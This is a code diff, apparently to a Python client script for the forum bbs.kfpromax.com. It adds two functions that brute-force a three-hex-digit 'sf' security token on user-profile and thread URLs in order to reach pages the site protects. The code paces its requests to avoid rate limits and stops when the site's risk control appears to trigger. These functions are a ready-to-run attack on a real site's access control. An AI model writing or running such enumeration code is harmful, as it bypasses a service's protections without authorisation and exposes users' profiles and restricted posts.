@@ -2,6 +2,7 @@
 # 不影响这些板块中回复发帖/编辑发帖/获取帖子原始内容的功能
 import os
 import re
+import time
 import requests
 from urllib.parse import quote
 from bs4 import BeautifulSoup
@@ -57,6 +58,41 @@ def upload_image(path):
     data = r.json()
     if not data["status"]: raise RuntimeError(data["message"])
     return data["data"]["links"]["url"]
+
+
+def search_user_sf(client, uid, start):
+    # 用户主页 sf 暴力搜索，用于只知道目标 uid 的情况
+    # 如果已知用户名，可以使用发件箱功能直接获取目标 uid 和 sf
+    cur = int(start, 16)
+    with open("sf_search.txt", "a", encoding="utf-8", buffering=1) as f:
+        while True:
+            sf = f"{cur:03x}"
+            resp = client.get(f"https://bbs.kfpromax.com/profile.php?action=show&uid={uid}&sf={sf}")
+            if resp.status_code >= 300: print("可能已被风控，即刻停止"); return
+            found = "注册时间" in resp.text
+            f.write(f"{uid}, {sf}, {found}\n")
+            print(f"{uid}, {sf}, {found}")
+            if found: return
+            if cur >= 0xFFF: return
+            cur += 1
+            time.sleep(3)
+
+
+def search_topic_sf(client, tid, start):
+    # 主题链接 sf 暴力搜索
+    cur = int(start, 16)
+    with open("sf_search.txt", "a", encoding="utf-8", buffering=1) as f:
+        while True:
+            sf = f"{cur:03x}"
+            resp = client.get(f"https://bbs.kfpromax.com/read.php?tid={tid}&sf={sf}")
+            if resp.status_code >= 300: print("可能已被风控，即刻停止"); return
+            found = "无安全验证" not in resp.text
+            f.write(f"{tid}, {sf}, {found}\n")
+            print(f"{tid}, {sf}, {found}")
+            if found: return
+            if cur >= 0xFFF: return
+            cur += 1
+            time.sleep(3)
 
 
 class Actions:
